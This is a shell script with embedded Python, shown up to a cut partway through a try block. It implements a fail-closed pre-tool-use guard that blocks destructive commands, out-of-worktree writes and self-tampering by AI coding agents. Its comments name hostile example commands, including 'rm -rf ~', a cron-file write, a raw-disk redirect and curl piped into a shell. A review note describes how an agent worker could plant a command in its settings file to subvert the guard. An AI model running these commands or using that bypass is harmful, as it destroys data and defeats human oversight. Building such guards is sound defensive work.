#!/usr/bin/env sh
# deny-hook.sh — PreToolUse guard for read-write workers (Bash, Edit, Write).
#
# The Never list and the worktree boundary are doctrine (runtime/sandbox-policy.md,
# playbooks/risk-review.md). Doctrine sits above the model; this sits below it.
# A read-write worker runs with the host's permission prompts turned down, so the
# only thing between an improvised `rm -rf ~` and the disk is a hook.
#
# Reads the PreToolUse event JSON on stdin and writes ONE decision object on
# stdout in the shape the host honors:
#
#   {"hookSpecificOutput":{"hookEventName":"PreToolUse",
#     "permissionDecision":"deny|ask","permissionDecisionReason":"…"}}
#
# The nesting is load-bearing: a top-level permissionDecision is ignored, which
# is how a deny silently becomes an allow. Every field is JSON-encoded by
# python3 — never printf-interpolated, since a path carrying a quote produces
# malformed JSON and a malformed decision is no decision at all.
#
# POLARITY IS FAIL-CLOSED. Unparseable stdin, absent stdin, no JSON parser on
# PATH, or a grep/sed/tr that is missing or errors all DENY. A boundary that
# fails open is not a boundary. Allow is the only decision this hook makes
# silently (exit 0, no output).
#
# HIGH tier (deny, never ask) for Bash. Every segment of a compound command is
# judged on its own, after ONE peeler in the payload reader (_command_words)
# strips what launches it: VAR=, env, sudo, doas, nohup, nice, time, timeout,
# exec, setsid, stdbuf, ionice, chrt, taskset, xargs, chroot, unshare, nsenter,
# strace, command, builtin, ( { !, if/then/do/while and case patterns. A command
# line run later or elsewhere is judged as segments of its own (#598): a `sh -c`
# or `eval` body, a trap action, an alias value, a gh shell alias, the string or
# command of flock, su, runuser, script, watch, parallel (its template completed
# with each ::: argument), ssh, find -exec, fd -x/-X, entr and zsh repeat,
# interpreter code handing a literal to os.system/subprocess (from python/perl/
# ruby/node/bun/php -c/-e, lua/luajit/julia/Rscript -e, the awk family program,
# deno eval, from stdin or a heredoc), a sqlite3 `.shell`/`.system` line, a sed
# `e` command, a busybox applet (W1-03), a program a shell reads on stdin or from a file written in the same
# command, and a head built from a variable or a substitution (its literal value
# on the line, what echo prints, else each refused head). Who reads a body is
# structural (PR #648 review): each simple command is its words plus its
# redirections wherever they sit, each pipeline stage (| or |&) a command with its
# own stdin; a heredoc or here-string is read by the command owning its << or <<<
# on fd 0 (or 3<<B 0<&3), an output redirection never stops it reading, cat/tee
# pass it on, and a group, loop, exec, function, xargs, read, <(...) or $(cat)
# hands it to what it runs. Sources are unioned, as zsh (MULTIOS) reads them all.
# printf/echo escapes (\xHH, \NNN, \n …) are decoded before the fed program is
# read. Words are quote-removed as the shell does it, ANSI-C $'...' decoded, and an
# unquoted $IFS/${IFS...} expansion separates words as a blank does (W1-02). So a
# refused shape is refused wherever it sits (#297; 2026-10-23 review, P1-3, P2-10;
# PR #648 review). An egress receipt &&-before a command arms the send it runs now
# — including one fed to a shell by a pipe or heredoc, where every heredoc and
# here-string on the line is judged — but never a DEFERRED send (a trap, alias or
# gh alias set runs later) or a REPEATED one (watch, find -exec, fd -x, xargs,
# parallel, entr, zsh repeat and a while/until condition may run it again, and
# one receipt covers one send): those need the receipt inside the command.
# The parser is differential-tested against real bash (scripts/deny_hook_corpus.py,
# tests/test_deny_hook_conformance.py). Still string matching: a script already on
# disk, a program a download or decoder produces, an alias or function defined in
# an EARLIER command, and a value computed at run time stay beyond it, and the
# Never list and the sandbox are the net for those. The refused shapes:
#   1. recursive delete whose every target is the root or home CLASS -- /, ~,
#      $HOME or ${HOME}, or everything one level under them, judged after `.`/`..`
#      collapse and a trailing glob (so /*/, /dev/../, ~/., ~/*, ${HOME}/* all
#      count, not just the canonical spellings, W1-06) -- or any recursive delete
#      carrying --no-preserve-root
#   2. force-push to the default branch, including the +main refspec form that
#      needs no flag at all — and deleting it outright, which carries no flag
#      either: `:main`, `git push -d`, `git push --delete` (#297). An effective
#      --force-with-lease exempts even the default branch (the lease pins the
#      remote head); the rule above reads unconditional, so say so here (#382).
#   3. `git push --force` / `-f` on any target without an effective lease — and
#      an effective explicit global force even with one, since Git documents
#      that it disables the --force-with-lease checks
#   4. `orca orchestration reset` — one command that discards a whole fleet's
#      dispatch state
#   5. an off-repo write (`gh pr|issue|release <write-verb>`; `gh repo|workflow|
#      run|gist|variable|cache|label|ssh-key|gpg-key|codespace|project` writes;
#      `gh api` with a write method/field), however launched, `sh -c`/`eval`
#      bodies included, with no egress receipt immediately &&-preceding
#      it in the same command (`egress.py write … &&`). Judged in the payload
#      reader, the only place the joining operators survive: a receipt joined
#      by || or ; proves nothing (the send runs even when the receipt failed),
#      and one receipt covers exactly one send. The receipt is free and
#      mechanical, so there is no legitimate unreceipted form to ask about;
#      the denial names the governed path. Doctrine:
#      merge-serialization.md (#368), enforced here since #561. Plain
#      `git push` is out of scope (branch pushes are evidenced by PR head
#      SHAs, and the force rules above already govern their dangerous forms).
#   6. `git push --mirror` / `--prune` — they delete remote refs they never name.
#      Push long options are matched by git's unambiguous-prefix rule (--del).
# Git global options between `git` and the subcommand (-C, -c, --git-dir and
# kin) are stripped before any of this is judged — `git -C /x push --force` is
# the push it names (#297). A deletion that spares the default branch asks
# rather than denies: re-pushing the ref recovers it, and recovery is a human
# call — except under a redirected repository (-C, --git-dir, GIT_DIR=), where
# the default is resolved in the hook's own cwd and the ref cannot be shown
# recoverable, so any remote-ref deletion denies (#321 review).
# --force-with-lease is deliberately NOT matched as a force-push — but a
# lease does not pardon a deletion (judged first) or an effective explicit
# global force, which Git documents as disabling the lease checks.
#
# Never list (ask, per runtime/sandbox-policy.md): live-prod mutation, credential
# provisioning (gh secret set|delete), destructive database or infrastructure
# teardown (gh repo delete too), unpinned remote code execution, publishing, and
# history-discarding local git. These are "ask" rather than "deny" because each
# has a legitimate form the human can authorize in the moment; the HIGH tier has
# none. Matched, not inferred: remote code is curl/wget piped into a shell or
# interpreter, run from <(...) or "$(...)", or downloaded and then run; local git
# is reset --hard, checkout/restore of the whole tree, checkout/switch -f, a
# whole-tree clean -f, branch -D/-M/-C/-f (the default branch too: origin still
# holds it), update-ref -d, reflog expire|delete, stash drop|clear,
# filter-repo|filter-branch, worktree remove -f. The as-written pass reads the
# segments with their real operators but drops what only carries text -- echo and
# printf arguments, a git -m / gh --body message, comments, heredoc data -- so a
# shape quoted as an example is not asked about (#598, from #602).
#
# Worktree boundary: when OPEN_FLEET_UNIT_WORKTREE is set (else its legacy alias
# ORCA_UNIT_WORKTREE, read only when the OPEN_FLEET_ name is unset or empty), a
# write outside it is DENIED.
# It covers the Edit/Write/MultiEdit file_path and NotebookEdit's notebook_path
# — the one write tool that spells the field differently (#297) — and, since a
# worker that can run a shell can spell the same write as `echo pwned >
# /etc/cron.d/x`, a Bash redirect or `tee` destination naming an ABSOLUTE path. Both go
# through one resolver, which follows the whole symlink chain, so an in-boundary
# name pointing out is judged by where it ends up however many links that takes.
# Path segments are names, never patterns; a glob in a shell target is also judged
# by every existing path the shell would expand it to (W4-09). A leading ~, ~user,
# $HOME or ${HOME} is expanded first (W1-01): `> ~/.bashrc` is a write to the home
# directory, not to ./~. A file-tool path carries no shell quoting, so it always
# expands; a shell word expands only when the lead is UNQUOTED, as bash does -- a
# quoted `'~/x'` (or single-quoted `'$HOME/x'`) stays the literal relative path (W1-01).
#
# What the Bash half does NOT cover, and says so at the block itself: a relative
# target (the hook is not told the worker's cwd, and the segment before it may
# have been a `cd`, so judging one would be guessing), a `cp`/`mv`/`dd of=`
# destination, a path built from a variable, and an interpreter writing through
# its own API. The disposable sandbox is the boundary for those. The process's
# own standard streams and /dev/null are allowed by name — not by a /dev/ prefix,
# which would waive `> /dev/sda` along with them.
#
# A payload that parses but names no file_path (a non-file tool) is allowed. When
# both names are unset or empty the boundary is not enforced — an unset boundary is a
# configuration choice, and this hook says so rather than guessing one.
#
# Exit codes. For Claude Code the DECISION is the output and the exit is 0 — a
# non-zero exit from a hook is a hook error there. Two exceptions, both exit 2
# with the reason on stderr (every audited host reads exit 2 as "block"):
#   * an empty or unparseable payload, ALWAYS — OpenHands and jcode fail OPEN on
#     exit 1 and on an exit-0 reply they cannot read (#577);
#   * STRICT mode, where an "ask" also becomes a deny (Codex rejects "ask" and
#     fails open; Hermes only reads "block"). Strict is OPEN_FLEET_HOOK_STRICT_EXIT
#     (or its legacy alias ORCA_HOOK_STRICT_EXIT) or OPEN_FLEET_HOOK_EXIT2 set to
#     anything but empty or 0 (any one; none overrides another), JCODE_HOOK_TOOL_NAME,
#     or a payload naming a non-Claude tool (exec_command, apply_patch, terminal,
#     shell, write_file, file_editor, any lowercase tool name). Claude Code's own
#     tool names are PascalCase, so its contract above is unchanged.
# Outside strict mode, CODEX_CI, CODEX_SANDBOX or OPEN_FLEET_HEADLESS_STRICT (set
# to anything but empty or 0) still turn an "ask" into a deny, at exit 0.
#
# Self-guard. A worker that can rewrite its own hook config is not guarded, so a
# write, edit, redirect, tee, rm/mv/cp/ln/install/rsync, sed -i/perl -i,
# truncate, dd of=, sort -o, ed/ex/vim, curl -o/wget -O, or chmod/chown/chgrp
# (bar an additive chmod mode) target naming a hook config
# (.claude/settings*.json, .codex/hooks.json, .openhands/hooks.json,
# .agents/plugins/orca-deny-hook/, .opencode/plugin/orca-deny-hook.ts,
# .open-fleet/, .crush/crush.json, .crush-orca-ro/, .hermes-open-fleet/), a pinned
# trust anchor (.orca/human-grant-pubkey, .orca/dispatch-pubkey) or this
# file is DENIED — relative or absolute, since the pattern needs no cwd, and for
# this file regardless of the worktree. A delete, mode or contents change of a
# directory above this file counts too. Inline interpreter code (python -c,
# perl -e, node -e, ...) naming a guard path beside a write call is judged a
# write to it; touch is not guarded (it changes no content or permission).
# A tar/patch that names a guard file as its own output (tar -cf, patch -o) is
# denied; an archive EXTRACTION (tar -x, unzip, cpio -i, patch) is asked when its
# destination covers the guard region -- the root, a directory above it, or any
# guard directory (or a guard file's directory) wherever its symlinks resolve, in
# the worktree or outside it -- since the member names are not visible here and
# the hook cannot prove the guard files untouched (W1-05).
#
# File touches (#590). With OPEN_FLEET_STATE_DB set, an allowed edit is recorded
# with its line range, the path RELATIVE to the unit worktree so two workers'
# edits of one repo file collide. An overlap warns on stderr and escalates to the
# coordinator; it never blocks the edit.
#
# How to wire — and what does NOT wire it. Nothing in this repository registers
# this hook, and this header used to say the dispatcher did (PR #277 review, P2).
# It cannot, on either lane spawn_worker.sh has: the supervised `worker-start`
# lane takes its launch args from the HOST's agentDefaultArgs, not from any
# command this repo builds, and an env var exported here does not cross the Orca
# daemon into the worker's process. A hook nobody registers is doctrine wearing a
# script's file extension, which is the thing this catalog exists to refuse.
#
# So you wire it, per host, and `deny-hook.sh --settings <worktree>` prints the
# exact block: a PreToolUse matcher over Bash|Edit|Write|NotebookEdit|MultiEdit
# plus ORCA_UNIT_WORKTREE=<the unit's own worktree>, which gives the freeze
# boundary for free. Merge it into the settings file the worker's agent reads.
#
# State the boundary honestly when you do: this runs INSIDE the worker's session,
# so it is defense-in-depth against an improvised command, the same advisory
# status the completion gate carries — not a soundness boundary against a worker
# that sets out to defeat it. The soundness boundary is the disposable sandbox
# for the danger lane.
set -eu

usage() {
  cat <<'USAGE'
deny-hook.sh — PreToolUse deny/ask guard for read-write workers.

Usage: deny-hook.sh [--help] [--settings <worktree> [--readonly]]
       deny-hook.sh --verify-settings <file> [--harness <name>] [--boundary <dir>]
  Reads a PreToolUse event JSON object on stdin; writes a decision object on
  stdout when the action is denied or must be asked, nothing when it is allowed.
  --settings <worktree> prints the settings.json block that registers this hook
  for one worker, with the boundary path resolved. Nothing registers it for you.
  --readonly adds the ro-tier write floor (OPEN_FLEET_HOOK_READONLY): every write
  the hook can see is then denied regardless of the boundary.
  --verify-settings proves a registration is armed by running it against deny
  and allow probes in the harness's own tool names. <name> is claude, codex,
  openhands, goose, crush, hermes (config.yaml), opencode/omp/pi (the .ts
  bridge), or jcode (<file> holds JCODE_HOOK_PRE_TOOL=<cmd>; "-" reads the env).
  Without --harness it is inferred from the path. --boundary <dir> requires the
  registration to bound exactly that worktree. A registration may name only this
  hook ([VAR=value ...] [sh] <path>/deny-hook.sh, same bytes); the probes run it
  under a scrubbed environment, never through sh -c (2026-10-26 review).

Environment:
  OPEN_FLEET_UNIT_WORKTREE  when set, a write outside this directory is denied:
                      the Edit/Write/MultiEdit file_path or NotebookEdit
                      notebook_path, and a Bash redirect or tee destination
                      naming an absolute path. ORCA_UNIT_WORKTREE is its legacy
                      alias, read only when OPEN_FLEET_UNIT_WORKTREE is unset
                      or empty.
  OPEN_FLEET_HOOK_READONLY (or ORCA_HOOK_READONLY)  ro-tier write floor: every
                      write the hook can see (a redirect, tee, file-tool edit or
                      apply_patch, in a -c body or a program fed to a shell
                      too) is denied regardless of the boundary, and so is a
                      shell fed a program the hook cannot read (cat f | sh),
                      while read-only shell still runs. Defense-in-depth, not an
                      fs sandbox (cp/mv/rm and an interpreter's own write are
                      beyond it). See runtime/sandbox-policy.md.
  OPEN_FLEET_HOOK_STRICT_EXIT=1, OPEN_FLEET_HOOK_EXIT2=1 or the legacy
  ORCA_HOOK_STRICT_EXIT=1  strict mode (any one): ask becomes deny, deny exits 2.
  CODEX_CI, CODEX_SANDBOX or OPEN_FLEET_HEADLESS_STRICT  set to anything but
                      empty or 0: ask becomes deny, the exit stays 0.

Exit: 0 with the decision on stdout (Claude Code); 2 with the reason on stderr
in strict mode, for unparseable input, and when grep, sed or tr is missing or
errors. Fail-closed: unparseable input, or a matcher that cannot run, denies.
USAGE
}

if [ "${1:-}" = "--help" ] || [ "${1:-}" = "-h" ]; then usage; exit 0; fi

# --settings <worktree> [--readonly]: print the registration block, boundary resolved. This is
# the whole answer to "how do I turn this on" — there is no dispatcher step that
# does it for you, and saying so in a --help is cheaper than a doc nobody reads.
# --readonly emits the ro-tier write floor (OPEN_FLEET_HOOK_READONLY): every write the hook
# can see is then denied regardless of the boundary (W4-05).
if [ "${1:-}" = "--settings" ]; then
  _settings_ro=0
  _settings_wt=""
  for _sa in "$2" "${3:-}"; do
    case "$_sa" in
      --readonly) _settings_ro=1 ;;
      "") : ;;
      *) [ -n "$_settings_wt" ] || _settings_wt=$_sa ;;
    esac
  done
  if [ -z "$_settings_wt" ]; then
    echo "deny-hook.sh --settings needs the worker's worktree path" >&2
    exit 2
  fi
  _wt=$(cd "$_settings_wt" 2>/dev/null && pwd -P) || {
    echo "deny-hook.sh --settings: '$_settings_wt' is not a directory" >&2
    exit 2
  }
  _self=$(cd "$(dirname -- "$0")" && pwd -P)/$(basename -- "$0")
  # Serialized, never interpolated: a POSIX path may legally contain a quote, a
  # backslash or a control character, and pasting one into a hand-built JSON
  # string yields either invalid JSON or a DIFFERENT path — a boundary silently
  # set somewhere else is worse than no boundary (PR #277 review, P2). Same
  # json.dumps the decision path below already uses.
  # The COMMAND is also shell-quoted (shlex.quote), because the host runs a hook
  # command through its shell: a space or `$` in the install path would tear the
  # command and the hook would never start, silently disabling every control
  # (W1-07; print-settings-snippet.sh / #382). A space-free path is unchanged.
  # Both boundary names are pinned to the same worktree (W1-08): the reader prefers
  # OPEN_FLEET_UNIT_WORKTREE, so pinning only the legacy ORCA_UNIT_WORKTREE let a stale inherited
  # OPEN_FLEET_UNIT_WORKTREE silently replace the per-worktree pin. install_worktree_hooks pins
  # both for the same reason; an explicit pin must win over anything inherited.
  python3 -I -c 'import json,shlex,sys
env = {"OPEN_FLEET_UNIT_WORKTREE": sys.argv[1], "ORCA_UNIT_WORKTREE": sys.argv[1]}
if sys.argv[3] == "1":
    env["OPEN_FLEET_HOOK_READONLY"] = "1"
print(json.dumps({
    "env": env,
    "hooks": {"PreToolUse": [{
        "matcher": "Bash|Edit|Write|NotebookEdit|MultiEdit",
        "hooks": [{"type": "command", "command": shlex.quote(sys.argv[2])}],
    }]},
}, indent=2))' "$_wt" "$_self" "$_settings_ro" || {
    echo "deny-hook.sh --settings: python3 is required to emit valid JSON" >&2
    exit 2
  }
  exit 0
fi
if [ "${1:-}" = "--verify-settings" ]; then
  # Is the guard actually armed in the named settings file? Parse the real
  # registration (PreToolUse entry, tool matcher, command, boundary env),
  # then run the REGISTERED command — not this copy — under its configured
  # environment against probes spelled in the HARNESS's own tool names: a
  # root delete, an outside-the-boundary redirect and write, and a write to
  # the hook's own config must deny; a plain `ls` must not (a hook that
  # denies everything is armed like a brick). Hosts that fail open on "ask"
  # must also see a Never-list command DENIED, and hosts that only honour
  # exit 2 (Hermes, jcode) must get exit 2. spawn_worker.sh calls this so
  # "wired" is verified, not assumed (#562, #577).
  if [ -z "${2:-}" ]; then
    echo "deny-hook.sh --verify-settings needs the settings file path" >&2
    exit 2
  fi
  _vs_file=$2
  _vs_harness=""
  _vs_boundary=""
  shift 2
  while [ $# -gt 0 ]; do
    case "$1" in
      --harness)
        _vs_harness=${2:-}
        [ -n "$_vs_harness" ] || { echo "deny-hook.sh --verify-settings: --harness needs a name" >&2; exit 2; }
        shift 2 ;;
      --boundary)
        # The worktree the spawn is about: the registration must bound exactly it (2026-10-26 review).
        _vs_boundary=${2:-}
        [ -n "$_vs_boundary" ] || { echo "deny-hook.sh --verify-settings: --boundary needs a directory" >&2; exit 2; }
        shift 2 ;;
      *)
        printf 'deny-hook.sh --verify-settings: unexpected argument: %s\n' "$1" >&2
        exit 2 ;;
    esac
  done
  _vs_self=$(cd "$(dirname -- "$0")" && pwd -P)/$(basename -- "$0")
  python3 -I - "$_vs_file" "$_vs_harness" "$_vs_self" "$_vs_boundary" <<'PYEOF'
import hashlib
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

arg_path, harness = sys.argv[1], sys.argv[2].strip().lower()
self_path, boundary_arg = sys.argv[3], sys.argv[4]
path = Path(arg_path)
KNOWN = ("claude", "codex", "openhands", "goose", "crush", "hermes",
         "opencode", "omp", "pi", "jcode", "generic")
BRIDGES = ("opencode", "omp", "pi")
# Hosts where an "ask" fails open or an exit-0 deny may be unread: the
# Never-list probe must come back DENIED, not asked.
STRICT_HOSTS = ("codex", "openhands", "goose", "hermes", "jcode", "crush") + BRIDGES
# Hosts that block ONLY on exit 2 (hermes reads decision "block", not "deny";
# jcode reads the exit status alone).
EXIT2_HOSTS = ("hermes", "jcode")


def refuse(reason):
    print(f"deny-hook: NOT ARMED in {arg_path}: {reason}", file=sys.stderr)
    return 2


if harness and harness not in KNOWN:
    sys.exit(refuse(f"unknown --harness {harness!r} (want {'|'.join(KNOWN)})"))

env = dict(os.environ)
raw_text = ""
if not (harness == "jcode" and arg_path == "-"):
    try:
        raw_text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as err:
        sys.exit(refuse(f"settings unreadable ({err})"))


def detect():
    parts = [p.lower() for p in path.parts]
    name = path.name.lower()
    if path.suffix in (".ts", ".js"):
        if "pi.on(" in raw_text or "omp" in name or "pi_" in name:
            return "omp"
        return "opencode"
    if path.suffix in (".yaml", ".yml") or any(p.startswith(".hermes") for p in parts):
        return "hermes"
    if ".codex" in parts:
        return "codex"
    if ".openhands" in parts:
        return "openhands"
    if "orca-deny-hook" in parts and ".agents" in parts:
        return "goose"
    if ".crush" in parts or ".crush-orca-ro" in parts:
        return "crush"
    if ".claude" in parts:
        return "claude"
    return "generic"


harness = harness or detect()


def boundary_for(command):
    m = re.search(
        r"(?:OPEN_FLEET_UNIT_WORKTREE|ORCA_UNIT_WORKTREE)=(\"[^\"]*\"|'[^']*'|\S+)",
        command,
    )
    if m:
        return m.group(1).strip("\"'")
    return env.get("OPEN_FLEET_UNIT_WORKTREE") or env.get("ORCA_UNIT_WORKTREE") or ""


# Per-harness tool names: (shell names any-of, write names ALL-of or any-of).
COVER = {
    "claude": (("Bash",), ("Edit", "Write"), all),
    "codex": (("Bash", "exec_command", "shell", "local_shell"), ("apply_patch",), all),
    "openhands": (("terminal", "execute_bash"), ("file_editor", "str_replace_editor", "apply_patch"), any),
    "goose": (("shell", "developer__shell"), ("write", "edit", "developer__text_editor", "text_editor"), any),
    "crush": (("bash",), ("write", "edit", "multiedit"), all),
    "hermes": (("terminal",), ("write_file", "patch"), all),
    "generic": (("Bash", "bash", "shell", "terminal", "exec_command", "execute_bash",
                 "developer__shell"),
                ("Edit", "edit", "Write", "write", "apply_patch", "file_editor", "replace",
                 "write_file", "patch", "multiedit", "MultiEdit", "str_replace_editor",
                 "developer__text_editor"), any),
}


def covers(matcher, tool):
    matcher = "" if matcher is None else str(matcher).strip()
    if matcher in ("", "*"):
        return True
    shell_names, write_names, mode = COVER[harness]
    names, need = (shell_names, any) if tool == "Bash" else (write_names, mode)
    try:
        return need(re.fullmatch(matcher, cand) is not None for cand in names)
    except re.error:
        return False


commands = {}
argv_mode = False  # hermes runs hook commands WITHOUT a shell (split_command_line)


def from_hook_entries(entries, key_cmd="command"):
    for entry in entries or []:
        if not isinstance(entry, dict):
            continue
        hook_list = entry.get("hooks") if isinstance(entry.get("hooks"), list) else [entry]
        for hook in hook_list:
            if not (isinstance(hook, dict)
                    and hook.get("type", "command") == "command"
                    and "deny-hook.sh" in str(hook.get(key_cmd, ""))):
                continue
            if harness == "goose" and hook.get("on_failure", entry.get("on_failure")) != "block":
                continue  # goose fails open on a hook error unless on_failure: block
            if harness == "hermes" and hook.get("fail_closed", hook.get("failClosed")) is not True:
                continue  # hermes fails open on a hook error unless fail_closed: true
            for tool in ("Bash", "Edit"):
                if tool not in commands and covers(entry.get("matcher"), tool):
                    commands[tool] = str(hook[key_cmd])


def load_mapping(text):
    try:
        return json.loads(text)
    except ValueError:
        pass
    try:
        import yaml  # optional: only the Hermes config mode needs it
        return yaml.safe_load(text)
    except ImportError:
        pass
    except Exception:
        return None
    return parse_simple_yaml(text)


def parse_simple_yaml(text):
    # Indentation parser for the hooks block: mappings and lists of mappings.
    lines = []
    for raw in text.splitlines():
        stripped = raw.split(" #", 1)[0].rstrip()
        if stripped.strip() and not stripped.lstrip().startswith("#"):
            lines.append((len(stripped) - len(stripped.lstrip()), stripped.strip()))

    def scalar(v):
        v = v.strip()
        if v[:1] in ("'", '"') and v[-1:] == v[:1] and len(v) >= 2:
            return v[1:-1]
        return {"true": True, "false": False, "null": None, "~": None}.get(v.lower(), v)

    def block(i, ind):
        if i < len(lines) and lines[i][1].startswith("- ") and lines[i][0] == ind:
            out = []
            while i < len(lines) and lines[i][0] == ind and lines[i][1].startswith("- "):
                first = lines[i][1][2:]
                sub = [(ind + 2, first)]
                j = i + 1
                while j < len(lines) and lines[j][0] > ind:
                    sub.append(lines[j])
                    j += 1
                saved = lines[:]
                lines[:] = sub
                val, _ = block(0, ind + 2) if ":" in first else (scalar(first), 0)
                lines[:] = saved
                out.append(val)
                i = j
            return out, i
        out = {}
        while i < len(lines) and lines[i][0] == ind:
            key, _, val = lines[i][1].partition(":")
            i += 1
            if val.strip():
                out[key.strip()] = scalar(val)
            elif i < len(lines) and lines[i][0] > ind:
                out[key.strip()], i = block(i, lines[i][0])
            elif i < len(lines) and lines[i][0] == ind and lines[i][1].startswith("- "):
                out[key.strip()], i = block(i, ind)
            else:
                out[key.strip()] = None
        return out, i

    try:
        return block(0, lines[0][0])[0] if lines else {}
    except (IndexError, ValueError):
        return None


settings = None
if harness == "jcode":
    cmd = ""
    if arg_path == "-":
        cmd = env.get("JCODE_HOOK_PRE_TOOL", "")
    else:
        for ln in raw_text.splitlines():
            ln = ln.strip()
            if ln.startswith("export "):
                ln = ln[7:].strip()
            if ln.startswith("JCODE_HOOK_PRE_TOOL="):
                val = ln.split("=", 1)[1]
                try:
                    words = shlex.split(val)
                    cmd = words[0] if len(words) == 1 else val
                except ValueError:
                    cmd = val
            elif re.match(r"(OPEN_FLEET_UNIT_WORKTREE|ORCA_UNIT_WORKTREE|ORCA_HOOK_STRICT_EXIT)=", ln):
                k, v = ln.split("=", 1)
                env[k] = v.strip("\"'")
    if "deny-hook.sh" not in cmd:
        sys.exit(refuse("JCODE_HOOK_PRE_TOOL does not run deny-hook.sh"))
    commands = {"Bash": cmd, "Edit": cmd}
elif harness in BRIDGES or path.suffix in (".ts", ".js"):
    env_driven = re.search(r"process\.env\.(OPEN_FLEET_DENY_HOOK|ORCA_DENY_HOOK_PATH)", raw_text)
    if "tool.execute.before" not in raw_text and "execute.before" not in raw_text \
            and "tool_call" not in raw_text and "PreToolUse" not in raw_text:
        sys.exit(refuse("bridge registers no pre-tool hook (tool_call / execute.before)"))
    if env_driven:
        # The bridge reads the hook path from the worker environment. It must
        # FAIL CLOSED without it, block a non-zero exit, and block an "ask".
        if not re.search(r"if\s*\(\s*!\s*hookPath\s*\)", raw_text):
            sys.exit(refuse("bridge does not fail closed when OPEN_FLEET_DENY_HOOK is unset"))
        if "status !== 0" not in raw_text and "status != 0" not in raw_text:
            sys.exit(refuse("bridge does not block on a non-zero hook exit"))
        if '"ask"' not in raw_text:
            sys.exit(refuse("bridge does not treat an ask decision as a block"))
        hook = env.get("OPEN_FLEET_DENY_HOOK") or env.get("ORCA_DENY_HOOK_PATH") or ""
        if not hook:
            sys.exit(refuse("bridge reads OPEN_FLEET_DENY_HOOK, which is unset here — "
                            "the worker would block every tool call"))
        if not Path(hook).is_file():
            sys.exit(refuse(f"OPEN_FLEET_DENY_HOOK={hook!r} is not a file"))
        cmd_str = "sh " + shlex.quote(hook)
    else:
        if "deny-hook.sh" not in raw_text:
            sys.exit(refuse("plugin wires neither deny-hook.sh nor OPEN_FLEET_DENY_HOOK"))
        m_cmd = re.search(
            r"((?:(?:OPEN_FLEET_UNIT_WORKTREE|ORCA_UNIT_WORKTREE)=\S+\s+)?(?:sh\s+)?[^\s\"'`]+deny-hook\.sh)",
            raw_text,
        )
        if not m_cmd:
            sys.exit(refuse("could not extract deny-hook.sh command from plugin"))
        cmd_str = m_cmd.group(1).strip("\"'`")
    m_wt = re.search(
        r"(?:OPEN_FLEET_UNIT_WORKTREE|ORCA_UNIT_WORKTREE)\s*[:=]\s*[\"']([^\"']+)[\"']",
        raw_text,
    )
    if m_wt and not boundary_for(cmd_str):
        env["ORCA_UNIT_WORKTREE"] = m_wt.group(1)
    if harness not in BRIDGES:
        harness = "opencode"
    commands = {"Bash": cmd_str, "Edit": cmd_str}
else:
    settings = load_mapping(raw_text)
    if settings is None:
        sys.exit(refuse("settings unreadable (not JSON or parseable YAML)"))
    if not isinstance(settings, dict):
        sys.exit(refuse("settings must be a JSON object"))
    hooks_obj = settings.get("hooks") if isinstance(settings.get("hooks"), dict) else settings
    if harness == "hermes":
        argv_mode = True
        from_hook_entries((hooks_obj or {}).get("pre_tool_call") if isinstance(hooks_obj, dict) else None)
    else:
        from_hook_entries(hooks_obj.get("PreToolUse") if isinstance(hooks_obj, dict) else None)
    missing = [tool for tool in ("Bash", "Edit") if tool not in commands]
    if missing:
        extra = {"goose": " with on_failure: block", "hermes": " with fail_closed: true"}.get(harness, "")
        sys.exit(refuse(
            f"no {'pre_tool_call' if harness == 'hermes' else 'PreToolUse'} registration of "
            f"deny-hook.sh{extra} covers {' and '.join(missing)} for {harness} "
            "(a mention elsewhere in the file is not a registration)"))
    registered_env = settings.get("env") or {}
    if not isinstance(registered_env, dict):
        sys.exit(refuse("settings env is not an object"))
    env.update({str(k): str(v) for k, v in registered_env.items()})

for tool, command in sorted(commands.items()):
    boundary = boundary_for(command)
    if not boundary or not Path(boundary).is_dir():
        sys.exit(refuse(
            f"no usable ORCA_UNIT_WORKTREE for the {tool} registration "
            "(settings env or an inline assignment) — the worktree boundary "
            "the registration exists to enforce is off"))
    if boundary_arg and os.path.realpath(boundary) != os.path.realpath(boundary_arg):
        sys.exit(refuse(
            f"the {tool} registration bounds {boundary!r}, not the worktree this spawn is about "
            f"({boundary_arg!r}) — a guard bounding another tree arms nothing here"))

# --- the registration must be THIS hook, and nothing else (2026-10-26 review) -----------------
# This gate used to run whatever command the settings file registered, through `sh -c`, under
# the coordinator's whole environment plus the file's own `env` block, with one shape check: the
# substring "deny-hook.sh". The natural wiring is a per-worktree .claude/settings.json INSIDE the
# tree a bypass-permissions worker writes, so a worker could plant
#   touch /pwned; exec sh /real/deny-hook.sh # deny-hook.sh
# (or an env.PATH naming its own sh) and have the coordinator run it at the next spawn into that
# worktree. Now a registration is [NAME=value …] [env] [sh|bash|dash] <path>/deny-hook.sh and
# nothing more; the path is a regular file whose bytes are this hook's; an assignment names only
# a variable the hook reads; and the probes run under a scrubbed environment — the coordinator's
# PATH/HOME/locale/TMPDIR, the registration's hook switches, nothing else — with a bare shell
# resolved on the coordinator's PATH, an explicit interpreter path run as registered once it lies
# outside the boundary, and never run through `sh -c`.
HOOK_ENV_KEYS = ("ORCA_UNIT_WORKTREE", "OPEN_FLEET_UNIT_WORKTREE", "ORCA_HOOK_STRICT_EXIT",
                 "OPEN_FLEET_HOOK_STRICT_EXIT", "OPEN_FLEET_HOOK_EXIT2", "OPEN_FLEET_HEADLESS_STRICT",
                 "ORCA_EGRESS_LEDGER", "OPEN_FLEET_EGRESS_LEDGER", "ORCA_FLEET_STATE_DB",
                 "OPEN_FLEET_STATE_DB", "OPEN_FLEET_SANDBOX_PROFILE", "ORCA_SANDBOX_PROFILE",
                 "OPEN_FLEET_DENY_HOOK", "ORCA_DENY_HOOK_PATH", "OPEN_FLEET_ROOT", "ORCA_FLEET_ROOT",
                 "GOOSE_MODE", "CODEX_CI", "CODEX_SANDBOX", "JCODE_HOOK_TOOL_NAME")
PASS_THROUGH = ("PATH", "HOME", "LANG", "TMPDIR", "TMP", "TEMP", "TERM")
STEERING = ("PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH", "PYTHONHOME", "PYTHONSTARTUP",
            "ENV", "BASH_ENV", "SHELLOPTS", "CDPATH", "IFS", "SHELL")
SHELLS = ("sh", "bash", "dash")
ASSIGN_RE = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)=(.*)", re.DOTALL)
try:
    self_digest = hashlib.sha256(Path(self_path).read_bytes()).hexdigest()
